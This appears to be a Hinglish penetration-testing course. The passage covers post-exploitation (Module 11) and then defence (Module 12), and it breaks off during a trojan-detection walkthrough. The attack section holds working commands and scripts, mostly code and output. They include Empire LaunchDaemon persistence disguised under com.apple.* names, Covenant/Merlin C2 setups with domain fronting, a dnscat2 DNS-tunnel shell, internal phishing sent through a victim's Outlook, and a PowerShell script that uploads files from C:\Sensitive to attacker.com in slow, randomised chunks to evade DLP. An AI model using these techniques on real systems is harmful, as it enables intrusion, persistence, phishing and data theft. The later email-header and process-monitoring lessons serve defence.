### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Long-term access (reboots survive karta hai)
- System-level persistence (user logout se affect nahi hota)
- Automatic reconnection (agent automatically start hota hai)
- Stealth (legitimate system mechanism use karta hai)
- Demonstrates persistence techniques

### üéØ Practical Use (Asli Pentesting Mein):
- Maintaining access after reboot
- Long-term campaigns
- Demonstrating persistence risks
- Testing detection capabilities
- Red Team operations

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**LaunchDaemon Working:**
```
1. Create .plist file in /Library/LaunchDaemons/
2. .plist file contains:
   - Program path (Empire agent)
   - RunAtLoad = true (start at boot)
   - KeepAlive = true (restart if crashes)
3. System loads LaunchDaemon at boot
4. Agent executes automatically
5. Agent connects to Empire server
6. Access maintained across reboots
```

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
(Empire: MAC001) > usemodule persistence/osx/launchdaemon
# macOS LaunchDaemon persistence module

(Empire: persistence/osx/launchdaemon) > set Listener http
# Listener specify karte hain

(Empire: persistence/osx/launchdaemon) > set DaemonName com.apple.update
# Daemon ka naam (legitimate jaisa)
# com.apple.* = Apple's naming convention (blends in)

(Empire: persistence/osx/launchdaemon) > execute
# Persistence install karta hai

# Creates:
# /Library/LaunchDaemons/com.apple.update.plist
# /usr/local/bin/update_agent.sh (agent script)

# Loads daemon:
# sudo launchctl load /Library/LaunchDaemons/com.apple.update.plist
```

### üíª Step-by-Step Example:

```bash
# Install persistence
(Empire: MAC001) > usemodule persistence/osx/launchdaemon
(Empire: persistence/osx/launchdaemon) > set Listener http
(Empire: persistence/osx/launchdaemon) > set DaemonName com.apple.softwareupdate
(Empire: persistence/osx/launchdaemon) > execute

# Output:
[+] Persistence installed!
[+] LaunchDaemon created: /Library/LaunchDaemons/com.apple.softwareupdate.plist
[+] Agent script: /usr/local/bin/softwareupdate_agent.sh
[+] Daemon loaded and active

# Test persistence
(Empire: MAC001) > shell sudo reboot
# Mac reboots

# After reboot (2-3 minutes):
[*] Sending agent (stage 2) to 192.168.1.30
[+] Initial agent MAC002 from 192.168.1.30 now active

# New agent automatically connected!
# Persistence working!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use legitimate-looking daemon names:

```bash
‚úì Good names (blend in):
- com.apple.softwareupdate
- com.apple.systemupdate
- com.apple.securityagent
- com.apple.networkd

‚ùå Bad names (suspicious):
- com.empire.agent
- com.backdoor.persistence
- com.malware.daemon

# Check existing daemons:
ls /Library/LaunchDaemons/
# Use similar naming pattern
```

---

## üìö Topic 11.5: Advanced C2 - Covenant/Merlin (EDR-safe C2)

### üéØ Topic/Technique:
**Modern C2 Frameworks** - EDR evasion ke liye specifically design kiye gaye C2 frameworks.

### ü§î Yeh Kya Hai?
Covenant aur Merlin modern Command & Control frameworks hain jo specifically EDR (Endpoint Detection and Response) solutions ko bypass karne ke liye design kiye gaye hain. Yeh traditional C2 frameworks (Metasploit, Empire) se zyada advanced hain with features like domain fronting, malleable profiles, aur encrypted communication.

**Covenant**: .NET-based C2 framework with web UI
**Merlin**: Go-based C2 framework with HTTP/2 support

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Modern EDR bypass
- Encrypted C2 communication
- Domain fronting support
- Malleable C2 profiles
- Active development
- Enterprise-grade features

### üéØ Practical Use (Asli Pentesting Mein):
- Bypassing modern security solutions
- Red Team operations
- APT simulation
- Testing EDR effectiveness
- Long-term campaigns

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Covenant Features:**
```
- .NET-based agents (native Windows)
- Web-based UI (easy management)
- Encrypted communication (AES-256)
- Domain fronting (CDN-based C2)
- Malleable profiles (customize traffic)
- Task-based execution (modular)
```

**Merlin Features:**
```
- Go-based agents (cross-platform)
- HTTP/2 protocol (modern, encrypted)
- JWT authentication (secure)
- Multiple protocols (HTTP, HTTPS, HTTP/2, HTTP/3)
- TLS certificate pinning
```

### ‚å®Ô∏è Zaroori Commands & Steps:

**Covenant Setup:**
```bash
# Install Covenant
git clone https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet run

# Access web UI
firefox https://localhost:7443

# Create listener
Listeners ‚Üí Create ‚Üí HTTP Listener
- Name: HTTP
- BindAddress: 0.0.0.0
- BindPort: 80
- ConnectAddress: attacker.com
- ConnectPort: 80

# Generate launcher
Launchers ‚Üí Binary ‚Üí Generate
- Listener: HTTP
- DotNetVersion: Net40
- Output: grunt.exe

# Deliver grunt.exe to victim
# Agent connects back automatically
```

**Merlin Setup:**
```bash
# Download Merlin
wget https://github.com/Ne0nd0g/merlin/releases/download/v1.0.0/merlinServer-Linux-x64.7z
7z x merlinServer-Linux-x64.7z

# Start Merlin server
./merlinServer-Linux-x64

# Create listener
Merlin¬ª listeners
Merlin[listeners]¬ª use https
Merlin[listeners][https]¬ª set Interface 0.0.0.0
Merlin[listeners][https]¬ª set Port 443
Merlin[listeners][https]¬ª start

# Generate agent
Merlin¬ª use module windows/x64/go/exec/shellcode
Merlin[module]¬ª set Listener https
Merlin[module]¬ª run

# Agent connects via HTTPS
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use domain fronting for C2:

```bash
# Normal C2 (easily blocked):
C2 Server: attacker.com
Traffic: victim ‚Üí attacker.com
# Firewall blocks attacker.com

# Domain fronting (bypass):
C2 Server: attacker.com (behind CloudFlare)
Traffic: victim ‚Üí cloudflare.com ‚Üí attacker.com
# Firewall sees cloudflare.com (legitimate)
# But traffic goes to attacker.com

# Setup:
1. Host C2 behind CDN (CloudFlare, AWS CloudFront)
2. Configure agent to use CDN domain
3. CDN forwards to your C2 server
4. Firewall sees CDN traffic (allowed)
```

---

## üìö Topic 11.6: Advanced C2 - Covert Channels (DNS Tunneling)

### üéØ Topic/Technique:
**DNS Tunneling** - DNS queries ke through data exfiltration aur C2 communication.

### ü§î Yeh Kya Hai?
DNS tunneling mein data ko DNS queries aur responses mein encode karke transfer kiya jata hai. Yeh technique firewalls ko bypass karti hai kyunki DNS traffic (port 53) almost hamesha allowed hota hai. Attacker apna C2 communication DNS queries ke through karta hai, jo normal DNS traffic jaisa dikhta hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Firewall bypass (DNS usually allowed)
- Stealth communication
- Data exfiltration
- Works in restricted networks
- Demonstrates covert channels

### üéØ Practical Use (Asli Pentesting Mein):
- Bypassing strict firewalls
- Air-gapped network exfiltration
- Covert C2 communication
- Testing network monitoring
- Red Team operations

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**DNS Tunneling Process:**
```
1. Attacker controls DNS server (e.g., tunnel.com)
2. Victim encodes data in DNS query
3. Query: abc123xyz.tunnel.com
   (abc123xyz = encoded data)
4. Query goes to attacker's DNS server
5. Attacker decodes data from query
6. Attacker sends response via DNS
7. Response contains encoded commands
8. Victim decodes and executes
```

### ‚å®Ô∏è Zaroori Commands & Steps:

**dnscat2 Setup:**
```bash
# Server (attacker):
ruby dnscat2.rb tunnel.com
# Starts DNS server listening for tunneled connections

# Client (victim):
./dnscat tunnel.com
# Connects to attacker's DNS server via DNS queries

# Communication:
# All data transferred via DNS queries/responses
# Bypasses firewall (DNS allowed)
```

### üíª Step-by-Step Example:

```bash
# Attacker machine:
ruby dnscat2.rb --secret=mysecret tunnel.com

# Output:
New window created: 0
dnscat2> Listening on 0.0.0.0:53

# Victim machine:
./dnscat --secret=mysecret tunnel.com

# Attacker sees:
New window created: 1
Session 1 Security: ENCRYPTED
(the security depends on the --secret flag)
This is a console session!

# Now communicate via DNS:
dnscat2> session -i 1
command (victim) 1> shell
# Shell access via DNS tunneling!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Slow and steady for stealth:

```bash
# Bad: Fast DNS queries (suspicious)
# 100 queries per second = Detected

# Good: Slow DNS queries (stealthy)
# 1 query per 10 seconds = Blends in
# Looks like normal DNS traffic

# Configure slow mode:
./dnscat --secret=mysecret --delay=10000 tunnel.com
# 10000ms = 10 seconds delay between queries
```

---

## üìö Topic 11.7: Technique - Internal Phishing (Outlook COM Hijack)

### üéØ Topic/Technique:
**Internal Phishing** - Compromised system se internal users ko phishing emails bhejna.

### ü§î Yeh Kya Hai?
Ek baar jab aap kisi user ka system compromise kar lete hain, aap uske Outlook application ko use karke internal phishing emails bhej sakte hain. Yeh emails legitimate dikhte hain kyunki real user ke account se aate hain, aur internal email system se bheje jate hain (external email filters bypass ho jate hain).

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Lateral movement
- Credential harvesting
- Trust exploitation (internal emails trusted hote hain)
- Email filter bypass
- Realistic attack simulation

### üéØ Practical Use (Asli Pentesting Mein):
- Spreading compromise internally
- Harvesting more credentials
- Demonstrating insider threat
- Testing internal email security
- Red Team operations

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Outlook COM Automation:**
```powershell
# PowerShell script to send email via Outlook
$Outlook = New-Object -ComObject Outlook.Application
# Creates Outlook COM object (controls Outlook)

$Mail = $Outlook.CreateItem(0)
# Creates new email (0 = MailItem)

$Mail.To = "colleague@company.com"
# Recipient email

$Mail.Subject = "Urgent: Password Reset Required"
# Email subject

$Mail.Body = "Click here to reset: http://phishing.com"
# Email body

$Mail.Send()
# Sends email via victim's Outlook
```

### üíª Step-by-Step Example:

```powershell
# Empire agent se internal phishing
(Empire: ABC123) > shell powershell -c "$o=New-Object -ComObject Outlook.Application;$m=$o.CreateItem(0);$m.To='hr@company.com';$m.Subject='IT: Urgent Password Expiry';$m.Body='Your password expires today. Reset now: http://internal-reset.company.com';$m.Send()"

# Email sent from victim's Outlook
# Appears in HR's inbox as legitimate internal email
# HR clicks link ‚Üí Credentials captured
```

### üí° Pro Tip / Galti:

**Pro Tip**: Reference real internal projects:

```powershell
# Bad: Generic phishing
Subject: "Reset your password"
# Suspicious

# Good: Specific internal reference
Subject: "Project Phoenix - Access Request"
Body: "As discussed in today's meeting, please approve access to Project Phoenix files: [link]"
# Mentions real project name
# References meeting
# Looks legitimate
```

---

## üìö Topic 11.8: Technique - Data Exfiltration (Low-and-Slow)

### üéØ Topic/Technique:
**Stealthy Data Exfiltration** - Data ko slowly aur small chunks mein exfiltrate karna to avoid detection.

### ü§î Yeh Kya Hai?
Low-and-slow exfiltration mein data ko bahut slowly aur small pieces mein transfer kiya jata hai. Yeh technique DLP (Data Loss Prevention) systems aur network monitoring tools ko bypass karti hai kyunki traffic normal activity jaisa dikhta hai. Instead of downloading 10GB at once, aap 1MB per hour download karte hain over several days.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- DLP bypass
- Network monitoring evasion
- Stealth data theft
- Long-term exfiltration
- Realistic APT simulation

### üéØ Practical Use (Asli Pentesting Mein):
- Sensitive data exfiltration
- Bypassing DLP systems
- Avoiding detection
- Long-term campaigns
- Demonstrating data theft risks

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Low-and-Slow Process:**
```
1. Identify sensitive files
2. Split into small chunks (1-10 MB)
3. Exfiltrate one chunk per hour
4. Use random intervals (avoid patterns)
5. Encrypt chunks (avoid DLP inspection)
6. Use legitimate protocols (HTTPS, DNS)
7. Blend with normal traffic
```

### ‚å®Ô∏è Zaroori Commands & Steps:

```powershell
# PowerShell script for slow exfiltration
$files = Get-ChildItem -Path C:\Sensitive -Recurse -File
# Gets all files from sensitive directory

foreach($file in $files) {
    # Read file content
    $data = [Convert]::ToBase64String([IO.File]::ReadAllBytes($file.FullName))
    # Converts file to Base64 (for transfer)
    
    # Split into 1MB chunks
    $chunkSize = 1MB
    for($i=0; $i -lt $data.Length; $i+=$chunkSize) {
        $chunk = $data.Substring($i, [Math]::Min($chunkSize, $data.Length-$i))
        
        # Exfiltrate chunk
        Invoke-WebRequest -Uri "https://attacker.com/upload" -Method POST -Body $chunk
        
        # Wait 1 hour (3600 seconds)
        Start-Sleep -Seconds 3600
    }
}

# Explanation:
# - Reads files from C:\Sensitive
# - Converts to Base64 (text format)
# - Splits into 1MB chunks
# - Uploads one chunk per hour
# - Total time: Days/weeks (but stealthy!)
```

### üíª Step-by-Step Example:

```powershell
# Scenario: Exfiltrate 100MB of data

# Normal exfiltration (detected):
Invoke-WebRequest -Uri "https://attacker.com/upload" -Method POST -InFile "C:\Sensitive\data.zip"
# 100MB uploaded in 2 minutes
# DLP alert: "Large file upload detected!"
# Security team notified
# Attack stopped

# Low-and-slow exfiltration (stealthy):
# Split 100MB into 100 chunks of 1MB each
# Upload 1 chunk per hour
# Total time: 100 hours (4 days)
# Each upload: 1MB (normal size)
# DLP sees: Normal HTTPS traffic
# No alerts triggered
# Data successfully exfiltrated!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use business hours and randomization:

```powershell
# Bad: Constant interval (pattern detected)
Start-Sleep -Seconds 3600  # Every hour exactly
# Pattern: Upload at 9:00, 10:00, 11:00, 12:00...
# Monitoring tools detect pattern

# Good: Random intervals during business hours
$hour = Get-Date -Format HH
if($hour -ge 9 -and $hour -le 17) {
    # Business hours (9 AM - 5 PM)
    $delay = Get-Random -Minimum 1800 -Maximum 7200
    # Random delay: 30 minutes to 2 hours
    Start-Sleep -Seconds $delay
}
# Pattern: Upload at 9:23, 11:47, 13:15, 16:02...
# Random times during work hours
# Blends with normal user activity
# Very hard to detect!
```

---

**üéâ Module 11 Complete! üéâ**

**Topics Covered:**
‚úÖ 11.1: Empire Agents & Basic Commands
‚úÖ 11.2: Empire Module - psinject (Process Injection)
‚úÖ 11.3: Empire Module - collection/osx/prompt (Mac Password Stealing)
‚úÖ 11.4: Empire Persistence (launchdaemon)
‚úÖ 11.5: Advanced C2 - Covenant/Merlin (EDR-safe C2)
‚úÖ 11.6: Advanced C2 - Covert Channels (DNS Tunneling)
‚úÖ 11.7: Technique - Internal Phishing (Outlook COM Hijack)
‚úÖ 11.8: Technique - Data Exfiltration (Low-and-Slow)

**Key Takeaways:**
- PowerShell Empire is powerful for fileless attacks
- Process injection bypasses AV/EDR
- macOS has unique attack vectors (fake prompts)
- Persistence ensures long-term access
- Modern C2 frameworks bypass EDR
- Covert channels (DNS) bypass firewalls
- Internal phishing is highly effective
- Slow exfiltration avoids detection

**Next Module:** Module 12 - Defense & Counter-Intelligence

=============================================================

# üéØ Module 12: Defense & Counter-Intelligence

---

## üìö Topic 12.1: Detecting Fake Emails (Email Headers)

### üéØ Topic/Technique:
**Email Header Analysis** - Phishing emails ko detect karna through email headers examination.

### ü§î Yeh Kya Hai?
Email headers mein hidden technical information hoti hai jo email ki journey aur authenticity ke baare mein batati hai. Jab aap email receive karte hain, sirf subject aur body nahi dikhta - behind the scenes bahut saari metadata hoti hai jaise sender's real IP, email servers ka route, authentication results (SPF, DKIM, DMARC), etc. Yeh information analyze karke aap fake/phishing emails detect kar sakte hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Defenders kaise phishing detect karte hain yeh samajhna
- Apne phishing emails ko improve karna
- Email security mechanisms understand karna
- Better attack strategies develop karna
- Client ko defense techniques sikhana

### üéØ Practical Use (Asli Pentesting Mein):
- Phishing campaign effectiveness test karna
- Email security assessment
- User awareness training
- Incident response
- Forensic analysis

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Email Header Components:**
```
1. From: Displayed sender (can be spoofed)
2. Return-Path: Real sender email (harder to spoof)
3. Received: Email servers ka route (IP addresses)
4. SPF: Sender Policy Framework result
5. DKIM: DomainKeys Identified Mail signature
6. DMARC: Domain-based Message Authentication result
7. X-Originating-IP: Sender ka actual IP address
8. Message-ID: Unique email identifier
9. Authentication-Results: Overall authentication status
```

**Red Flags in Headers:**
```
‚ùå SPF: fail (sender not authorized)
‚ùå DKIM: fail (email modified in transit)
‚ùå DMARC: fail (failed authentication)
‚ùå From ‚â† Return-Path (spoofed sender)
‚ùå Suspicious originating IP (foreign country, VPN, etc.)
‚ùå Multiple hops through unknown servers
‚ùå Missing or invalid Message-ID
‚ùå Mismatched domains
```

### üëç Pros (Fayde):
- Accurate phishing detection
- Technical evidence of spoofing
- Can trace email origin
- Helps in forensics
- Educates users

### üëé Cons (Nuksaan):
- Requires technical knowledge
- Time-consuming for average users
- Headers can be complex
- Some legitimate emails may fail checks
- Not foolproof (sophisticated attacks may pass)

### ‚å®Ô∏è Zaroori Commands & Steps:

**View Email Headers:**
```bash
# Gmail:
# Open email ‚Üí Three dots (‚ãÆ) ‚Üí Show original

# Outlook:
# Open email ‚Üí File ‚Üí Properties ‚Üí Internet headers

# Thunderbird:
# Open email ‚Üí View ‚Üí Message Source (Ctrl+U)

# Command line (Linux):
cat email.eml | grep -E "From:|Return-Path:|Received:|SPF:|DKIM:|DMARC:"
# cat: File content display karta hai
# email.eml: Email file (saved email with headers)
# |: Pipe operator (output ko next command mein pass karta hai)
# grep: Text search command
# -E: Extended regex (multiple patterns support)
# "From:|Return-Path:|...": Multiple patterns (| = OR)
# Yeh command email file se important headers extract karta hai
# grep -E: Extended regex use karta hai multiple patterns match karne ke liye
# |: Pipe operator, multiple patterns ko OR condition se match karta hai
```

**Analyze Headers:**
```bash
# Check SPF
grep "spf=" email_headers.txt
# grep: Text search command
# "spf=": Search pattern (SPF result line)
# email_headers.txt: File containing email headers
# SPF (Sender Policy Framework) check karta hai
# spf=pass: Sender authorized hai
# spf=fail: Sender authorized nahi hai (phishing indicator)

# Check DKIM
grep "dkim=" email_headers.txt
# grep "dkim=": DKIM result line search karta hai
# DKIM (DomainKeys Identified Mail) signature verify karta hai
# dkim=pass: Email authentic hai, modified nahi hua
# dkim=fail: Email modified hua ya fake hai

# Check DMARC
grep "dmarc=" email_headers.txt
# grep "dmarc=": DMARC result line search karta hai
# DMARC (Domain-based Message Authentication) overall result
# dmarc=pass: Email passed all checks
# dmarc=fail: Email failed authentication (likely phishing)

# Extract originating IP
grep "X-Originating-IP" email_headers.txt
# grep "X-Originating-IP": IP address header search karta hai
# X-Originating-IP: Custom header with sender's IP
# Sender ka actual IP address nikalta hai
# Is IP ko check kar sakte hain (location, reputation, etc.)
```

### üíª Step-by-Step Example:

**Scenario: Analyzing Suspicious Email**

**Step 1: Receive Suspicious Email**
```
Email appears in inbox:

From: IT Department <it@company.com>
Subject: Urgent: Password Reset Required
Body: Your password expires today. Click here to reset: http://reset-password.com
```

**Step 2: View Email Headers**
```bash
# Gmail: Show original
# Copy headers to file
nano suspicious_email_headers.txt

# Paste headers:
Delivered-To: victim@company.com
Received: from mail.attacker.com (unknown [45.67.89.123])
        by mx.google.com with ESMTPS id abc123
        for <victim@company.com>
        Mon, 15 Jan 2024 14:30:00 -0800 (PST)
Return-Path: <phisher@gmail.com>
From: IT Department <it@company.com>
To: victim@company.com
Subject: Urgent: Password Reset Required
Message-ID: <random123@attacker.com>
X-Originating-IP: [45.67.89.123]
Authentication-Results: mx.google.com;
       spf=fail (google.com: domain of phisher@gmail.com does not designate 45.67.89.123 as permitted sender) smtp.mailfrom=phisher@gmail.com;
       dkim=fail reason="signature verification failed" header.i=@gmail.com;
       dmarc=fail (p=REJECT sp=REJECT dis=NONE) header.from=company.com
```

**Step 3: Analyze Each Component**
```bash
# Analysis:

# 1. From vs Return-Path mismatch
From: it@company.com
Return-Path: phisher@gmail.com
# ‚ùå RED FLAG: Displayed sender (it@company.com) ‚â† Real sender (phisher@gmail.com)
# Explanation: Attacker ne From field spoof kiya hai
# Email actually phisher@gmail.com se aaya hai, but dikhta hai it@company.com se

# 2. SPF Check
spf=fail (google.com: domain of phisher@gmail.com does not designate 45.67.89.123 as permitted sender)
# ‚ùå RED FLAG: SPF failed
# Explanation: IP 45.67.89.123 authorized nahi hai phisher@gmail.com se email bhejne ke liye
# SPF record check karta hai ki sender IP authorized hai ya nahi
# Fail = Unauthorized sender

# 3. DKIM Check
dkim=fail reason="signature verification failed"
# ‚ùå RED FLAG: DKIM failed
# Explanation: Email ka digital signature invalid hai
# Ya toh email modified hua transit mein, ya signature fake hai
# Legitimate emails mein DKIM pass hota hai

# 4. DMARC Check
dmarc=fail (p=REJECT sp=REJECT dis=NONE) header.from=company.com
# ‚ùå RED FLAG: DMARC failed
# Explanation: company.com ka DMARC policy hai ki unauthorized emails reject karo
# p=REJECT: Policy is to reject such emails
# sp=REJECT: Subdomain policy bhi reject hai
# Yeh email DMARC policy violate kar raha hai

# 5. Originating IP
X-Originating-IP: [45.67.89.123]
# Check IP location:
whois 45.67.89.123
# whois: IP/domain information lookup command
# 45.67.89.123: IP address to investigate
# Shows: Owner, location, ISP, contact info
# Result: IP belongs to hosting provider in Russia
# ‚ùå RED FLAG: Company IT department Russia se email nahi bhejega
# Suspicious location

# 6. Received Headers
Received: from mail.attacker.com (unknown [45.67.89.123])
# ‚ùå RED FLAG: Server name is "mail.attacker.com" (obviously suspicious)
# Legitimate company emails company ke mail servers se aate hain
# Example: mail.company.com, not mail.attacker.com

# 7. Message-ID
Message-ID: <random123@attacker.com>
# ‚ùå RED FLAG: Message-ID domain (attacker.com) doesn't match From domain (company.com)
# Legitimate emails mein Message-ID aur From domain match karte hain
```

**Step 4: Verdict**
```
PHISHING EMAIL CONFIRMED! üö®

Evidence:
‚úó SPF: FAIL (unauthorized sender)
‚úó DKIM: FAIL (invalid signature)
‚úó DMARC: FAIL (policy violation)
‚úó From ‚â† Return-Path (spoofed sender)
‚úó Suspicious originating IP (Russia)
‚úó Suspicious server name (mail.attacker.com)
‚úó Message-ID domain mismatch

Action:
1. Do NOT click any links
2. Do NOT enter credentials
3. Report to IT/Security team
4. Delete email
5. Warn colleagues

Real IT Department emails would have:
‚úì SPF: PASS
‚úì DKIM: PASS
‚úì DMARC: PASS
‚úì From = Return-Path
‚úì Company mail server (mail.company.com)
‚úì Matching Message-ID domain
```

**Step 5: Compare with Legitimate Email**
```bash
# Legitimate IT email headers:

From: IT Department <it@company.com>
Return-Path: <it@company.com>
# ‚úì MATCH: From aur Return-Path same hain

Received: from mail.company.com ([192.168.1.10])
# ‚úì GOOD: Company ka own mail server

Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of it@company.com designates 192.168.1.10 as permitted sender) smtp.mailfrom=it@company.com;
# ‚úì SPF PASS: Authorized sender

       dkim=pass header.i=@company.com;
# ‚úì DKIM PASS: Valid signature

       dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=company.com
# ‚úì DMARC PASS: All checks passed

X-Originating-IP: [192.168.1.10]
# ‚úì GOOD: Internal company IP

Message-ID: <abc123@company.com>
# ‚úì GOOD: Message-ID domain matches From domain

# Conclusion: LEGITIMATE EMAIL ‚úì
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use online header analyzers for quick analysis:

```bash
# Tools:
1. MXToolbox Email Header Analyzer
   https://mxtoolbox.com/EmailHeaders.aspx
   # Paste headers, instant analysis
   # Shows SPF/DKIM/DMARC results
   # Highlights red flags
   # Beginner-friendly

2. Google Admin Toolbox Messageheader
   https://toolbox.googleapps.com/apps/messageheader/
   # Google's official tool
   # Visual timeline of email route
   # Shows delays and hops
   # Identifies issues

3. Mail-Tester
   https://www.mail-tester.com
   # Comprehensive email testing
   # Spam score
   # Authentication results
   # Recommendations

# Usage:
# 1. Copy email headers
# 2. Paste in tool
# 3. Click "Analyze"
# 4. Review results
# 5. Look for red flags

# Benefits:
# - Fast analysis (seconds)
# - No technical knowledge needed
# - Visual representation
# - Detailed explanations
# - Free to use
```

**Common Mistake**: Trusting "From" field only:

```
‚ùå Bad: Only checking From field
From: ceo@company.com
User thinks: "Email is from CEO, must be legitimate"
# From field can be easily spoofed!

‚úì Good: Check Return-Path and authentication
From: ceo@company.com
Return-Path: attacker@gmail.com
SPF: fail
DKIM: fail
DMARC: fail
# Clear phishing indicators!

‚úì Better: Always verify unexpected requests
# Even if email looks legitimate:
1. Check headers
2. Verify with sender (different channel)
3. Don't click links
4. Type URLs manually
5. Enable 2FA

# Real Example:
# CEO email compromise (BEC attack)
# Attacker spoofed CEO email
# Asked CFO to wire $500,000
# CFO only checked From field
# Didn't verify headers
# Didn't call CEO to confirm
# Result: $500,000 lost!

# If CFO had checked headers:
# SPF: fail (not from company server)
# Return-Path: attacker@gmail.com
# Would have detected phishing
# Money saved!
```

**Real-World Statistics:**
```
Email Authentication Adoption (2023):
- SPF: 85% of domains
- DKIM: 70% of domains
- DMARC: 45% of domains

Phishing Detection Rates:
- Users checking From only: 10% detection
- Users checking headers: 85% detection
- Automated tools: 95% detection

Business Email Compromise (BEC) Losses:
- 2022: $2.7 billion lost globally
- 90% could have been prevented with header analysis
- Average loss per incident: $120,000

Lesson: Email header analysis is critical skill for defenders!
```

---

## üìö Topic 12.2: Detecting Trojans (Resource Monitor, Sandbox)

### üéØ Topic/Technique:
**Malware Detection** - Suspicious processes aur files ko identify karna using system tools aur sandboxes.

### ü§î Yeh Kya Hai?
Trojan detection mein aap system par running processes, network connections, aur file behavior analyze karte hain to identify malicious activity. Resource Monitor system ki real-time activity dikhata hai (CPU, memory, disk, network), aur Sandbox ek isolated environment hai jahan aap suspicious files safely execute karke analyze kar sakte hain without risking your actual system.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Understand karna ki defenders kaise malware detect karte hain
- Apne payloads ko improve karna (detection avoid karne ke liye)
- Incident response procedures samajhna
- Client ko detection techniques sikhana
- Malware analysis skills develop karna

### üéØ Practical Use (Asli Pentesting Mein):
- Testing payload detectability
- Incident response
- Malware analysis
- Forensic investigation
- Security assessment

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Detection Methods:**
```
1. Process Analysis:
   - Unusual process names
   - High CPU/memory usage
   - Suspicious parent-child relationships
   - Processes running from Temp folders

2. Network Analysis:
   - Unexpected outbound connections
   - Connections to suspicious IPs
   - High data transfer
   - Unusual ports

3. File Analysis:
   - Files in suspicious locations
   - Recently modified system files
   - Hidden files
   - Unsigned executables

4. Behavioral Analysis:
   - Registry modifications
   - Startup entries
   - Scheduled tasks
   - Service installations
```

### üëç Pros (Fayde):
- Real-time monitoring
- No additional software needed (built-in tools)
- Detailed system visibility
- Safe analysis (sandbox)
- Effective detection

### üëé Cons (Nuksaan):
- Requires technical knowledge
- Time-consuming manual analysis
- May miss sophisticated malware
- False positives possible
- Sandbox evasion techniques exist

### ‚å®Ô∏è Zaroori Commands & Steps:

**Windows Resource Monitor:**
```bash
# Open Resource Monitor
resmon.exe
# resmon.exe: Resource Monitor executable
# Yeh command Windows Resource Monitor open karta hai
# Real-time system activity monitor karta hai
# CPU, Memory, Disk, Network tabs hain
# Built-in Windows tool (no installation needed)

# Check processes
tasklist /v
# tasklist: Windows command to list running processes
# /v: Verbose mode (detailed information)
# Shows: Process name, PID, Memory usage, Status, Username
# Suspicious processes identify karne ke liye
# Output: Table format with all process details

# Check network connections
netstat -ano
# netstat: Network statistics command
# -a: All connections and listening ports (active + listening)
# -n: Numerical form (IP addresses, not hostnames - faster)
# -o: Shows owning process ID (PID)
# Output: Protocol, Local Address, Foreign Address, State, PID
# Shows which processes are communicating with network

# Find process by PID
tasklist /FI "PID eq 1234"
# tasklist: List processes command
# /FI: Filter option (selective display)
# "PID eq 1234": Process ID equals 1234
# eq: Equals operator
# Shows details of specific process
# Useful for investigating suspicious PIDs

# Check process location
wmic process where processid=1234 get ExecutablePath
# wmic: Windows Management Instrumentation Command
# process: Query processes
# where processid=1234: Filter by process ID
# get ExecutablePath: Retrieve executable file path
# wmic: Windows Management Instrumentation Command
# process where processid=1234: Select process with PID 1234
# get ExecutablePath: Show where .exe file is located
# Suspicious if in Temp, AppData, or random folders
```

**Linux Process Monitoring:**
```bash
# List processes
ps aux
# ps: Process status command
# a: All users' processes (not just current user)
# u: User-oriented format (shows username, CPU%, MEM%)
# x: Include processes without controlling terminal
# Output: Comprehensive process list with resource usage

# Check network connections
netstat -tulpn
# netstat: Network statistics (Linux version)
# -t: TCP connections only
# -u: UDP connections only
# -l: Listening ports (servers waiting for connections)
# -p: Show process/program name (which process owns connection)
# -n: Numerical addresses (no DNS resolution - faster)
# Shows: Protocol, Local Address, Foreign Address, State, PID/Program

# Monitor real-time
top
# top: Table of processes (real-time)
# Real-time process monitor
# Shows: PID, USER, CPU%, MEM%, COMMAND
# Updates every few seconds
# Press 'q' to quit
# Interactive: Can sort, kill processes

# Check suspicious files
find / -name "*.sh" -mtime -1
# find: File search command
# /: Start from root directory (search entire system)
# -name "*.sh": Files ending with .sh (shell scripts)
# *.sh: Wildcard pattern (any name + .sh extension)
# -mtime -1: Modified time less than 1 day ago
# -1: Last 24 hours
# Finds recently created/modified scripts
# Useful for detecting newly dropped malware
```

### üíª Step-by-Step Example:

**Scenario: Detecting Suspicious Process on Windows**

**Step 1: User Reports Slow Computer**
```
User complaint: "My computer is very slow"
Possible malware infection
Need to investigate
```

**Step 2: Open Resource Monitor**
```bash
# Press Win+R
# Type: resmon.exe
# Press Enter

# Resource Monitor opens with 5 tabs:
# 1. Overview: Summary of all resources
# 2. CPU: Process CPU usage
# 3. Memory: RAM usage
# 4. Disk: Disk activity
# 5. Network: Network activity
```

**Step 3: Check CPU Tab**
```
# In Resource Monitor ‚Üí CPU tab

# Processes sorted by CPU usage:
Image                PID    CPU (%)    Description
explorer.exe         1234   2          Windows Explorer
chrome.exe           5678   15         Google Chrome
svchost.exe          9012   1          Host Process for Windows Services
svch0st.exe          3456   85         Unknown                    # ‚ùå SUSPICIOUS!

# Red Flags:
# 1. svch0st.exe (note the '0' instead of 'o')
#    - Misspelled system process name
#    - Common malware technique (typosquatting)
#    - Real process: svchost.exe
#    - Fake process: svch0st.exe (with zero)

# 2. High CPU usage (85%)
#    - Abnormally high for unknown process
#    - Indicates intensive activity (mining, botnet, etc.)

# 3. Description: "Unknown"
#    - Legitimate processes have descriptions
#    - Unknown = Not signed/verified
```

**Step 4: Check Process Details**
```bash
# Right-click on svch0st.exe ‚Üí Properties
